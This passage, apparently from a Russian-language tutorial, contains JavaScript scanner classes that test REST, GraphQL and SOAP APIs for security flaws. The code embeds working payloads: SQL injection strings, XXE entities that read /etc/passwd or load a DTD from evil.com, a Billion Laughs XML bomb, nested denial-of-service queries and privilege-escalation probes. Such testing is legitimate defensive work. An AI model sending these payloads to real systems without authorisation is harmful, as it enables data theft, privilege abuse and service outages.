                    'Validate and sanitize all user inputs'
                ]
            });
        }
        
        return recommendations;
    }
    
    countByType(issues, type) {
        return issues.filter(issue => issue.type === type).length;
    }
    
    async makeRequest(method, url, data = null, headers = {}) {
        const startTime = Date.now();
        
        try {
            const options = {
                method: method,
                headers: {
                    ...this.config.headers,
                    ...headers
                },
                timeout: this.config.timeout
            };
            
            if (data) {
                options.body = typeof data === 'object' ? JSON.stringify(data) : data;
                options.headers['Content-Type'] = 'application/json';
            }
            
            const response = await fetch(url, options);
            const body = await response.text();
            
            return {
                status: response.status,
                headers: Object.fromEntries(response.headers.entries()),
                body: body,
                responseTime: Date.now() - startTime
            };
        } catch (error) {
            return {
                error: error.message,
                responseTime: Date.now() - startTime
            };
        }
    }
    
    getAuthenticatedHeaders() {
        if (this.authenticatedSession) {
            return { 'Authorization': `Bearer ${this.authenticatedSession.token}` };
        }
        return {};
    }
    
    getNonAdminHeaders() {
        // Заголовки для неадминистративного пользователя
        return { 'Authorization': `Bearer ${this.nonAdminToken}` };
    }
    
    getAnonymousHeaders() {
        return {};
    }
    
    parseYAML(yamlString) {
        // Упрощенный парсер YAML (в реальности использовать библиотеку)
        try {
            return JSON.parse(yamlString.replace(/(\w+):/g, '"$1":').replace(/'/g, '"'));
        } catch {
            return {};
        }
    }
}

// Использование REST API тестера
const restTester = new RESTAPISecurityTester({
    baseUrl: 'https://api.example.com',
    headers: {
        'User-Agent': 'Security-Scanner/1.0'
    },
    timeout: 10000
});

async function runRESTSecurityTest() {
    const results = await restTester.testRESTAPI();
    console.log('REST API Security Test Results:', JSON.stringify(results, null, 2));
    return results;
}
```

### 2. GraphQL API тестирование

```javascript
// GraphQL API Security Testing
class GraphQLSecurityTester {
    constructor(config) {
        this.config = config;
        this.endpoint = config.graphqlEndpoint || '/graphql';
        this.introspectionQuery = `{
            __schema {
                types {
                    name
                    fields {
                        name
                        args {
                            name
                            type {
                                name
                                ofType {
                                    name
                                    ofType {
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }`;
    }
    
    async testGraphQLAPI() {
        const results = {
            introspection: await this.testIntrospection(),
            schemaAnalysis: await this.analyzeSchema(),
            injection: await this.testInjection(),
            authorization: await this.testAuthorization(),
            rateLimiting: await this.testRateLimiting(),
            denialOfService: await this.testDenialOfService(),
            summary: null
        };
        
        results.summary = this.generateGraphQLSummary(results);
        
        return results;
    }
    
    async testIntrospection() {
        const results = {
            introspectionEnabled: false,
            vulnerable: false,
            issues: []
        };
        
        try {
            const response = await this.makeGraphQLRequest(this.introspectionQuery);
            
            if (response.status === 200 && response.body?.data?.__schema) {
                results.introspectionEnabled = true;
                
                // Проверка на уязвимости через introspection
                const schema = response.body.data.__schema;
                if (schema.types.length > 100) { // Подозрительно много типов
                    results.vulnerable = true;
                    results.issues.push({
                        type: 'Schema Disclosure',
                        severity: 'MEDIUM',
                        description: 'Large schema disclosed through introspection',
                        cvssScore: 5.3,
                        cweId: 'CWE-200'
                    });
                }
            }
        } catch (error) {
            // Introspection отключен или недоступен
        }
        
        return results;
    }
    
    async analyzeSchema() {
        const analysis = {
            types: [],
            queries: [],
            mutations: [],
            subscriptions: [],
            securityIssues: []
        };
        
        try {
            const response = await this.makeGraphQLRequest(this.introspectionQuery);
            if (response.status === 200 && response.body?.data?.__schema) {
                const schema = response.body.data.__schema;
                
                for (const type of schema.types) {
                    if (type.fields) {
                        const typeInfo = {
                            name: type.name,
                            fields: type.fields.map(field => ({
                                name: field.name,
                                args: field.args
                            })),
                            isQuery: type.name === 'Query',
                            isMutation: type.name === 'Mutation',
                            isSubscription: type.name === 'Subscription'
                        };
                        
                        analysis.types.push(typeInfo);
                        
                        if (type.name === 'Query') {
                            analysis.queries = typeInfo.fields;
                        } else if (type.name === 'Mutation') {
                            analysis.mutations = typeInfo.fields;
                        } else if (type.name === 'Subscription') {
                            analysis.subscriptions = typeInfo.fields;
                        }
                    }
                }
                
                // Анализ на наличие подозрительных полей
                analysis.securityIssues = this.analyzeSchemaForSecurityIssues(analysis);
            }
        } catch (error) {
            console.error('Schema analysis failed:', error);
        }
        
        return analysis;
    }
    
    analyzeSchemaForSecurityIssues(schemaAnalysis) {
        const issues = [];
        
        // Проверка на подозрительные названия полей
        const suspiciousFieldNames = [
            'delete', 'remove', 'drop', 'truncate', 'exec', 'eval', 'shell',
            'system', 'command', 'script', 'run', 'execute'
        ];
        
        for (const query of schemaAnalysis.queries) {
            if (suspiciousFieldNames.some(name => query.name.toLowerCase().includes(name))) {
                issues.push({
                    type: 'Suspicious Query Field',
                    severity: 'MEDIUM',
                    field: query.name,
                    description: 'Query field with potentially dangerous name',
                    cvssScore: 6.5,
                    cweId: 'CWE-749'
                });
            }
        }
        
        for (const mutation of schemaAnalysis.mutations) {
            if (suspiciousFieldNames.some(name => mutation.name.toLowerCase().includes(name))) {
                issues.push({
                    type: 'Suspicious Mutation Field',
                    severity: 'HIGH',
                    field: mutation.name,
                    description: 'Mutation field with potentially dangerous name',
                    cvssScore: 7.5,
                    cweId: 'CWE-749'
                });
            }
        }
        
        return issues;
    }
    
    async testInjection() {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                sql: false,
                command: false,
                pathTraversal: false
            }
        };
        
        // Тестирование на GraphQL Injection
        const injectionQueries = [
            `{ user(id: "1' OR '1'='1") { id name } }`,
            `{ user(id: "1\" OR \"1\"=\"1") { id name } }`,
            `{ user(id: "1'; DROP TABLE users; --") { id name } }`,
            `{ user(id: "1\\\" UNION SELECT password FROM users --") { id name } }`
        ];
        
        for (const query of injectionQueries) {
            try {
                const response = await this.makeGraphQLRequest(query);
                
                // Проверка на SQL ошибки в ответе
                const sqlErrorPatterns = [
                    /SQL syntax/,
                    /mysql/i,
                    /postgresql/i,
                    /ora-\d{4}/i,
                    /sqlite/i
                ];
                
                const responseBody = JSON.stringify(response.body || {});
                
                for (const pattern of sqlErrorPatterns) {
                    if (pattern.test(responseBody)) {
                        results.vulnerable = true;
                        results.types.sql = true;
                        results.issues.push({
                            type: 'GraphQL SQL Injection',
                            severity: 'CRITICAL',
                            query: query,
                            evidence: `SQL error pattern found: ${pattern}`,
                            cvssScore: 9.8,
                            cweId: 'CWE-89'
                        });
                        break;
                    }
                }
            } catch (error) {
                // Продолжаем с другими тестами
            }
        }
        
        return results;
    }
    
    async testAuthorization() {
        const results = {
            vulnerable: false,
            issues: [],
            horizontal: false,
            vertical: false
        };
        
        // Тестирование горизонтального эскалирования
        const horizontalResult = await this.testGraphQLHorizontalPrivilegeEscalation();
        if (horizontalResult.vulnerable) {
            results.vulnerable = true;
            results.horizontal = true;
            results.issues.push(...horizontalResult.issues);
        }
        
        // Тестирование вертикального эскалирования
        const verticalResult = await this.testGraphQLVerticalPrivilegeEscalation();
        if (verticalResult.vulnerable) {
            results.vulnerable = true;
            results.vertical = true;
            results.issues.push(...verticalResult.issues);
        }
        
        return results;
    }
    
    async testGraphQLHorizontalPrivilegeEscalation() {
        const results = {
            vulnerable: false,
            issues: []
        };
        
        // Попытка доступа к чужим данным через GraphQL
        const queriesToTest = [
            `{ user(id: "2") { id name email } }`,  // Попытка получить данные другого пользователя
            `{ users { id name email } }`,         // Попытка получить всех пользователей
            `{ posts(authorId: "2") { title content author { id name } } }` // Попытка получить чужие посты
        ];
        
        for (const query of queriesToTest) {
            const response = await this.makeGraphQLRequest(query, this.getAuthenticatedHeaders());
            
            if (response.status === 200 && response.body?.data) {
                // Проверка, есть ли доступ к данным других пользователей
                if (this.containsOtherUsersData(response.body.data)) {
                    results.vulnerable = true;
                    results.issues.push({
                        type: 'GraphQL Horizontal Privilege Escalation',
                        severity: 'HIGH',
                        query: query,
                        description: 'Access to other users\' data detected',
                        cvssScore: 7.5,
                        cweId: 'CWE-285'
                    });
                }
            }
        }
        
        return results;
    }
    
    containsOtherUsersData(data) {
        // Проверка, содержит ли ответ данные других пользователей
        // Реализация зависит от структуры данных
        if (typeof data !== 'object' || data === null) return false;
        
        for (const [key, value] of Object.entries(data)) {
            if (key.includes('user') && Array.isArray(value) && value.length > 1) {
                return true; // Подозрительно много пользовательских данных
            }
            if (typeof value === 'object' && value !== null) {
                if (this.containsOtherUsersData(value)) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    async testGraphQLVerticalPrivilegeEscalation() {
        const results = {
            vulnerable: false,
            issues: []
        };
        
        // Тестирование административных операций
        const adminQueries = [
            `{ adminSettings { config database } }`,
            `mutation { deleteUser(id: "1") { success } }`,
            `mutation { updateRole(userId: "1", role: "admin") { success } }`,
            `{ systemLogs { level message timestamp } }`
        ];
        
        for (const query of adminQueries) {
            const response = await this.makeGraphQLRequest(query, this.getNonAdminHeaders());
            
            if (response.status === 200 && response.body?.data) {
                // Если неадминистратор может выполнить административные операции
                results.vulnerable = true;
                results.issues.push({
                    type: 'GraphQL Vertical Privilege Escalation',
                    severity: 'CRITICAL',
                    query: query,
                    description: 'Non-admin user can perform admin operations',
                    cvssScore: 9.8,
                    cweId: 'CWE-285'
                });
            }
        }
        
        return results;
    }
    
    async testDenialOfService() {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                resourceExhaustion: false,
                queryComplexity: false,
                nesting: false
            }
        };
        
        // Тестирование на resource exhaustion
        const complexQuery = this.generateComplexQuery();
        const response = await this.makeGraphQLRequest(complexQuery);
        
        if (response.responseTime > 10000) { // >10 секунд
            results.vulnerable = true;
            results.types.resourceExhaustion = true;
            results.issues.push({
                type: 'GraphQL Denial of Service - Resource Exhaustion',
                severity: 'HIGH',
                responseTime: response.responseTime,
                description: 'Complex query causes excessive response time',
                cvssScore: 7.5,
                cweId: 'CWE-400'
            });
        }
        
        // Тестирование на чрезмерную вложенность
        const nestedQuery = this.generateDeeplyNestedQuery();
        const nestedResponse = await this.makeGraphQLRequest(nestedQuery);
        
        if (nestedResponse.responseTime > 5000) {
            results.vulnerable = true;
            results.types.nesting = true;
            results.issues.push({
                type: 'GraphQL Denial of Service - Deep Nesting',
                severity: 'MEDIUM',
                responseTime: nestedResponse.responseTime,
                description: 'Deeply nested query causes performance degradation',
                cvssScore: 6.5,
                cweId: 'CWE-400'
            });
        }
        
        return results;
    }
    
    generateComplexQuery() {
        // Генерация сложного запроса для тестирования DoS
        return `
            query {
                users(first: 1000) {
                    edges {
                        node {
                            id
                            name
                            posts(first: 100) {
                                edges {
                                    node {
                                        id
                                        title
                                        comments(first: 100) {
                                            edges {
                                                node {
                                                    id
                                                    content
                                                    author {
                                                        id
                                                        name
                                                        posts(first: 50) {
                                                            edges {
                                                                node {
                                                                    id
                                                                    title
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        `;
    }
    
    generateDeeplyNestedQuery() {
        // Генерация глубоко вложенного запроса
        let query = '{ user(id: "1") { id name';
        for (let i = 0; i < 20; i++) {
            query += ` friends(first: 5) { edges { node { id name`;
        }
        query += ' '.repeat(20 * 14) + '}'.repeat(20 * 2) + ' }';
        return query;
    }
    
    async makeGraphQLRequest(query, headers = {}) {
        const startTime = Date.now();
        
        try {
            const response = await fetch(this.config.baseUrl + this.endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...this.config.headers,
                    ...headers
                },
                body: JSON.stringify({ query })
            });
            
            const body = await response.json();
            
            return {
                status: response.status,
                headers: Object.fromEntries(response.headers.entries()),
                body: body,
                responseTime: Date.now() - startTime
            };
        } catch (error) {
            return {
                error: error.message,
                responseTime: Date.now() - startTime
            };
        }
    }
    
    generateGraphQLSummary(results) {
        return {
            totalTests: Object.keys(results).length - 1, // исключая summary
            vulnerabilitiesFound: results.schemaAnalysis.securityIssues.length + 
                                 results.injection.issues.length + 
                                 results.authorization.issues.length +
                                 results.denialOfService.issues.length,
            byType: {
                schemaIssues: results.schemaAnalysis.securityIssues.length,
                injection: results.injection.issues.length,
                authorization: results.authorization.issues.length,
                dos: results.denialOfService.issues.length
            },
            overallRisk: this.calculateGraphQLRisk(results),
            recommendations: this.generateGraphQLRecommendations(results)
        };
    }
    
    calculateGraphQLRisk(results) {
        let riskScore = 0;
        
        riskScore += results.schemaAnalysis.securityIssues.length * 5;
        riskScore += results.injection.issues.length * 25;
        riskScore += results.authorization.issues.length * 30;
        riskScore += results.denialOfService.issues.length * 15;
        
        if (riskScore >= 50) return 'CRITICAL';
        if (riskScore >= 30) return 'HIGH';
        if (riskScore >= 15) return 'MEDIUM';
        if (riskScore > 0) return 'LOW';
        return 'SECURE';
    }
    
    generateGraphQLRecommendations(results) {
        const recommendations = [];
        
        if (results.introspection.introspectionEnabled) {
            recommendations.push({
                priority: 'MEDIUM',
                title: 'Disable GraphQL Introspection in Production',
                description: 'GraphQL introspection is enabled, exposing schema details',
                actions: [
                    'Disable introspection in production environments',
                    'Implement schema hiding mechanisms',
                    'Use persisted queries'
                ]
            });
        }
        
        if (results.injection.vulnerable) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Fix GraphQL Injection Vulnerabilities',
                description: 'GraphQL injection vulnerabilities detected',
                actions: [
                    'Implement proper input validation',
                    'Use parameterized queries',
                    'Apply query depth limiting'
                ]
            });
        }
        
        if (results.authorization.vulnerable) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Fix GraphQL Authorization Issues',
                description: 'Authorization bypass vulnerabilities detected',
                actions: [
                    'Implement proper authorization checks',
                    'Use GraphQL middleware for access control',
                    'Validate user permissions for each field'
                ]
            });
        }
        
        if (results.denialOfService.vulnerable) {
            recommendations.push({
                priority: 'HIGH',
                title: 'Implement GraphQL Query Limits',
                description: 'DoS vulnerabilities detected',
                actions: [
                    'Implement query depth limiting',
                    'Set maximum query complexity',
                    'Add request rate limiting'
                ]
            });
        }
        
        return recommendations;
    }
    
    getAuthenticatedHeaders() {
        if (this.authenticatedSession) {
            return { 'Authorization': `Bearer ${this.authenticatedSession.token}` };
        }
        return {};
    }
    
    getNonAdminHeaders() {
        // Заголовки для неадминистратора
        return { 'Authorization': `Bearer ${this.nonAdminToken}` };
    }
}

// Использование GraphQL тестера
const graphqlTester = new GraphQLSecurityTester({
    baseUrl: 'https://api.example.com',
    graphqlEndpoint: '/graphql'
});

async function runGraphQLSecurityTest() {
    const results = await graphqlTester.testGraphQLAPI();
    console.log('GraphQL Security Test Results:', JSON.stringify(results, null, 2));
    return results;
}
```

### 3. SOAP API тестирование

```javascript
// SOAP API Security Testing
class SOAPSecurityTester {
    constructor(config) {
        this.config = config;
        this.wsdlEndpoint = config.wsdlEndpoint || '/?wsdl';
        this.soapActions = [];
    }
    
    async testSOAPAPI() {
        const results = {
            wsdlAnalysis: await this.analyzeWSDL(),
            soapActions: await this.enumerateSOAPActions(),
            injection: await this.testSOAPInjection(),
            authentication: await this.testSOAPAuthentication(),
            authorization: await this.testSOAPAuthorization(),
            xmlSecurity: await this.testXMLSecurity(),
            summary: null
        };
        
        results.summary = this.generateSOAPSummary(results);
        
        return results;
    }
    
    async analyzeWSDL() {
        const results = {
            wsdlAvailable: false,
            operations: [],
            bindings: [],
            securityPolicies: [],
            vulnerabilities: []
        };
        
        try {
            const wsdlResponse = await this.makeRequest('GET', this.config.baseUrl + this.wsdlEndpoint);
            
            if (wsdlResponse.status === 200 && wsdlResponse.body) {
                results.wsdlAvailable = true;
                
                // Парсинг WSDL (упрощенный)
                const wsdl = this.parseWSDL(wsdlResponse.body);
                
                if (wsdl.operations) {
                    results.operations = wsdl.operations;
                }
                
                if (wsdl.bindings) {
                    results.bindings = wsdl.bindings;
                }
                
                // Проверка на отсутствие политик безопасности
                if (!wsdl.securityPolicies || wsdl.securityPolicies.length === 0) {
                    results.vulnerabilities.push({
                        type: 'Missing Security Policies',
                        severity: 'HIGH',
                        description: 'No WS-Security policies defined in WSDL',
                        cvssScore: 7.5,
                        cweId: 'CWE-311'
                    });
                }
            }
        } catch (error) {
            console.error('WSDL analysis failed:', error);
        }
        
        return results;
    }
    
    parseWSDL(wsdlContent) {
        // Упрощенный парсер WSDL
        const operations = [];
        const bindings = [];
        const securityPolicies = [];
        
        // В реальности использовать полноценный XML парсер
        const wsdl = wsdlContent.toLowerCase();
        
        // Поиск операций
        const operationMatches = wsdl.match(/<operation[^>]*name=["']([^"']*)["']/g);
        if (operationMatches) {
            for (const match of operationMatches) {
                const nameMatch = match.match(/name=["']([^"']*)["']/);
                if (nameMatch) {
                    operations.push({ name: nameMatch[1] });
                }
            }
        }
        
        // Поиск привязок
        const bindingMatches = wsdl.match(/<binding[^>]*name=["']([^"']*)["']/g);
        if (bindingMatches) {
            for (const match of bindingMatches) {
                const nameMatch = match.match(/name=["']([^"']*)["']/);
                if (nameMatch) {
                    bindings.push({ name: nameMatch[1] });
                }
            }
        }
        
        // Поиск политик безопасности
        const securityMatches = wsdl.match(/<wsp:policy|<sp:|<wsse:/g);
        if (securityMatches) {
            securityPolicies.push(...securityMatches);
        }
        
        return {
            operations,
            bindings,
            securityPolicies
        };
    }
    
    async enumerateSOAPActions() {
        const actions = [];
        
        if (!this.wsdlAnalysis.wsdlAvailable) {
            return actions;
        }
        
        // Использование WSDL для перечисления действий
        for (const operation of this.wsdlAnalysis.operations) {
            actions.push({
                name: operation.name,
                soapAction: this.constructSOAPAction(operation.name),
                parameters: await this.getOperationParameters(operation.name)
            });
        }
        
        return actions;
    }
    
    constructSOAPAction(operationName) {
        // Конструирование SOAP Action из WSDL
        return `urn:${operationName}`;
    }
    
    async getOperationParameters(operationName) {
        // Получение параметров операции из WSDL
        // В реальности использовать полноценный WSDL парсер
        return [
            { name: 'param1', type: 'string', required: true },
            { name: 'param2', type: 'int', required: false }
        ]; // Заглушка
    }
    
    async testSOAPInjection() {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                xmlInjection: false,
                xpathInjection: false,
                xsltInjection: false
            }
        };
        
        // Создание вредоносных SOAP сообщений
        const maliciousSOAPMessages = [
            // XML Injection
            `<?xml version="1.0"?>
             <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                 <soap:Body>
                     <${this.getRandomOperation()}>
                         <param1><![CDATA[<script>alert('XSS')</script>]]></param1>
                     </${this.getRandomOperation()}>
                 </soap:Body>
             </soap:Envelope>`,
            
            // XPath Injection
            `<?xml version="1.0"?>
             <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                 <soap:Body>
                     <${this.getRandomOperation()}>
                         <param1>1' or '1'='1</param1>
                     </${this.getRandomOperation()}>
                 </soap:Body>
             </soap:Envelope>`,
            
            // External Entity Injection
            `<?xml version="1.0"?>
             <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
             <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                 <soap:Body>
                     <${this.getRandomOperation()}>
                         <param1>&xxe;</param1>
                     </${this.getRandomOperation()}>
                 </soap:Body>
             </soap:Envelope>`
        ];
        
        for (const message of maliciousSOAPMessages) {
            try {
                const response = await this.makeSOAPRequest(message);
                
                // Проверка на утечку информации
                if (response.body && response.body.includes('root:x:0:0:')) {
                    results.vulnerable = true;
                    results.types.xxe = true;
                    results.issues.push({
                        type: 'SOAP XXE Injection',
                        severity: 'CRITICAL',
                        payload: message.substring(0, 200) + '...',
                        evidence: 'System file content exposed',
                        cvssScore: 9.8,
                        cweId: 'CWE-611'
                    });
                }
                
                // Проверка на SQL ошибки
                const sqlErrorPatterns = [
                    /SQL syntax/,
                    /mysql/i,
                    /postgresql/i,
                    /ora-\d{4}/i
                ];
                
                for (const pattern of sqlErrorPatterns) {
                    if (pattern.test(response.body)) {
                        results.vulnerable = true;
                        results.types.xmlInjection = true;
                        results.issues.push({
                            type: 'SOAP SQL Injection',
                            severity: 'CRITICAL',
                            payload: message.substring(0, 200) + '...',
                            evidence: `SQL error pattern found: ${pattern}`,
                            cvssScore: 9.8,
                            cweId: 'CWE-89'
                        });
                        break;
                    }
                }
            } catch (error) {
                // Продолжаем с другими тестами
            }
        }
        
        return results;
    }
    
    getRandomOperation() {
        if (this.soapActions.length > 0) {
            const randomIndex = Math.floor(Math.random() * this.soapActions.length);
            return this.soapActions[randomIndex].name;
        }
        return 'TestOperation';
    }
    
    async makeSOAPRequest(soapMessage, headers = {}) {
        const startTime = Date.now();
        
        try {
            const response = await fetch(this.config.baseUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/xml; charset=utf-8',
                    'SOAPAction': '"http://tempuri.org/TestOperation"',
                    ...this.config.headers,
                    ...headers
                },
                body: soapMessage
            });
            
            const body = await response.text();
            
            return {
                status: response.status,
                headers: Object.fromEntries(response.headers.entries()),
                body: body,
                responseTime: Date.now() - startTime
            };
        } catch (error) {
            return {
                error: error.message,
                responseTime: Date.now() - startTime
            };
        }
    }
    
    async testXMLSecurity() {
        const results = {
            vulnerable: false,
            issues: [],
            types: {
                xxe: false,
                xpathInjection: false,
                xmlBomb: false,
                improperParsing: false
            }
        };
        
        // Тестирование XXE
        const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [
                <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
                <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
                %dtd;
                %all;
            ]>
            <root>&send;</root>`;
        
        const xxeResponse = await this.makeSOAPRequest(xxePayload);
        
        if (xxeResponse.body && (xxeResponse.body.includes('root:x:0:0:') || 
                                xxeResponse.body.includes('Administrator'))) {
            results.vulnerable = true;
            results.types.xxe = true;
            results.issues.push({
                type: 'XML External Entity (XXE) Injection',
                severity: 'CRITICAL',
                payload: 'XXE Payload',
                evidence: 'System file content exposed',
                cvssScore: 9.8,
                cweId: 'CWE-611'
            });
        }
        
        // Тестирование XML Bomb (Billion Laughs Attack)
        const xmlBomb = `<?xml version="1.0"?>
            <!DOCTYPE lolz [
                <!ENTITY lol "lol">
                <!ELEMENT lolz (#PCDATA)>
                <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
                <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
                <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
                <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
                <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
            ]>
            <lolz>&lol9;</lolz>`;
        
        const bombStartTime = Date.now();
        const bombResponse = await this.makeSOAPRequest(xmlBomb);
        const bombResponseTime = Date.now() - bombStartTime;
        
        if (bombResponseTime > 10000) { // >10 секунд - признак DoS
            results.vulnerable = true;
            results.types.xmlBomb = true;
            results.issues.push({
                type: 'XML Bomb Attack',
                severity: 'HIGH',
                responseTime: bombResponseTime,
                description: 'Server vulnerable to XML entity expansion attack',
                cvssScore: 7.5,
                cweId: 'CWE-400'
            });
        }
        
        return results;
    }
    
    async testSOAPAuthentication() {
        const results = {
            requiresAuthentication: false,
            authenticationMethod: null,
            vulnerable: false,
            issues: []
        };
        
        // Проверка без аутентификации
        const testOperation = this.getRandomOperation();
        const testMessage = `<?xml version="1.0"?>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                    <${testOperation}>
                        <param1>test</param1>
                    </${testOperation}>
                </soap:Body>
            </soap:Envelope>`;
        
        const response = await this.makeSOAPRequest(testMessage);
        
        if (response.status === 200) {
            // Операция выполнена без аутентификации
            results.requiresAuthentication = false;
            results.vulnerable = true;
            results.issues.push({
                type: 'Missing Authentication',
                severity: 'HIGH',
                operation: testOperation,
                description: 'SOAP operation accessible without authentication',
                cvssScore: 7.5,
                cweId: 'CWE-306'
            });
        } else if (response.status === 401 || response.status === 403) {
            results.requiresAuthentication = true;
            
            // Определение метода аутентификации
            if (response.headers['www-authenticate']) {
                results.authenticationMethod = 'HTTP Basic';
            } else if (response.body && response.body.includes('wsse:Security')) {
                results.authenticationMethod = 'WS-Security';
            } else if (response.body && response.body.includes('UsernameToken')) {
                results.authenticationMethod = 'SOAP UsernameToken';
            }
        }
        
        return results;
    }
    
    async testSOAPAuthorization() {
        const results = {
            vulnerable: false,
            issues: [],
            horizontal: false,
            vertical: false
        };
        
        // Тестирование горизонтального эскалирования
        const horizontalResult = await this.testSOAPHorizontalPrivilegeEscalation();
        if (horizontalResult.vulnerable) {
            results.vulnerable = true;
            results.horizontal = true;
            results.issues.push(...horizontalResult.issues);
        }
        
        // Тестирование вертикального эскалирования
        const verticalResult = await this.testSOAPVerticalPrivilegeEscalation();
        if (verticalResult.vulnerable) {
            results.vulnerable = true;
            results.vertical = true;
            results.issues.push(...verticalResult.issues);
        }
        
        return results;
    }
    
    async testSOAPHorizontalPrivilegeEscalation() {
        const results = {
            vulnerable: false,
            issues: []
        };
        
        // Попытка получить данные другого пользователя
        const operationsToTest = this.soapActions.filter(op => 
            op.name.toLowerCase().includes('user') || 
            op.name.toLowerCase().includes('get') ||
            op.name.toLowerCase().includes('retrieve')
        );
        
        for (const operation of operationsToTest) {
            const maliciousMessage = `<?xml version="1.0"?>
                <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                    <soap:Body>
                        <${operation.name}>
                            <userId>2</userId> <!-- Попытка доступа к чужому пользователю -->
                        </${operation.name}>
                    </soap:Body>
                </soap:Envelope>`;
            
            const response = await this.makeSOAPRequest(maliciousMessage, this.getAuthenticatedHeaders());
            
            if (response.status === 200 && response.body && !response.body.includes('Access Denied')) {
                results.vulnerable = true;
                results.issues.push({
                    type: 'SOAP Horizontal Privilege Escalation',
                    severity: 'HIGH',
                    operation: operation.name,
                    description: 'Access to other user\'s data possible',
                    cvssScore: 7.5,
                    cweId: 'CWE-285'
                });
            }
        }
        
        return results;
    }
    
    async testSOAPVerticalPrivilegeEscalation() {
        const results = {
            vulnerable: false,
            issues: []
        };
        
        // Попытка выполнить административные операции
        const adminOperations = this.soapActions.filter(op => 
            op.name.toLowerCase().includes('admin') ||
            op.name.toLowerCase().includes('delete') ||
            op.name.toLowerCase().includes('create') ||
            op.name.toLowerCase().includes('update') ||
            op.name.toLowerCase().includes('system')
        );
        
        for (const operation of adminOperations) {
            const adminMessage = `<?xml version="1.0"?>
                <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                    <soap:Body>
                        <${operation.name}>
                            <adminParam>value</adminParam>
                        </${operation.name}>
                    </soap:Body>
                </soap:Envelope>`;
            
            const response = await this.makeSOAPRequest(adminMessage, this.getNonAdminHeaders());
            
            if (response.status === 200 && response.body && !response.body.includes('Access Denied')) {
                results.vulnerable = true;
                results.issues.push({
                    type: 'SOAP Vertical Privilege Escalation',
                    severity: 'CRITICAL',
                    operation: operation.name,
                    description: 'Non-admin user can perform admin operations',
                    cvssScore: 9.8,
                    cweId: 'CWE-285'
                });
            }
        }
        
        return results;
    }
    
    generateSOAPSummary(results) {
        return {
            wsdlAvailable: results.wsdlAnalysis.wsdlAvailable,
            totalOperations: results.soapActions.length,
            vulnerabilitiesFound: this.countSOAPVulnerabilities(results),
            byType: this.countBySOAPType(results),
            overallRisk: this.calculateSOAPRisk(results),
            recommendations: this.generateSOAPRecommendations(results)
        };
    }
    
    countSOAPVulnerabilities(results) {
        return results.soapActions.vulnerabilities.length +
               results.injection.issues.length +
               results.authentication.issues.length +
               results.authorization.issues.length +
               results.xmlSecurity.issues.length;
    }
    
    countBySOAPType(results) {
        return {
            wsdlIssues: results.wsdlAnalysis.vulnerabilities.length,
            injection: results.injection.issues.length,
            auth: results.authentication.issues.length,
            authz: results.authorization.issues.length,
            xmlSecurity: results.xmlSecurity.issues.length
        };
    }
    
    calculateSOAPRisk(results) {
        let riskScore = 0;
        
        riskScore += results.wsdlAnalysis.vulnerabilities.length * 5;
        riskScore += results.injection.issues.length * 25;
        riskScore += results.authentication.issues.length * 20;
        riskScore += results.authorization.issues.length * 25;
        riskScore += results.xmlSecurity.issues.length * 30;
        
        if (riskScore >= 50) return 'CRITICAL';
        if (riskScore >= 30) return 'HIGH';
        if (riskScore >= 15) return 'MEDIUM';
        if (riskScore > 0) return 'LOW';
        return 'SECURE';
    }
    
    generateSOAPRecommendations(results) {
        const recommendations = [];
        
        if (results.wsdlAnalysis.vulnerabilities.length > 0) {
            recommendations.push({
                priority: 'HIGH',
                title: 'Secure WSDL Configuration',
                description: 'WSDL exposes security vulnerabilities',
                actions: [
                    'Implement WS-Security policies',
                    'Remove sensitive information from WSDL',
                    'Use WS-I Basic Profile compliance'
                ]
            });
        }
        
        if (results.xmlSecurity.vulnerable) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Fix XML Security Issues',
                description: 'XML processing vulnerabilities detected',
                actions: [
                    'Disable external entity processing',
                    'Implement XML schema validation',
                    'Use secure XML parsers'
                ]
            });
        }
        
        if (results.authentication.vulnerable) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Implement SOAP Authentication',
                description: 'Missing authentication for SOAP operations',
                actions: [
                    'Implement WS-Security UsernameToken',
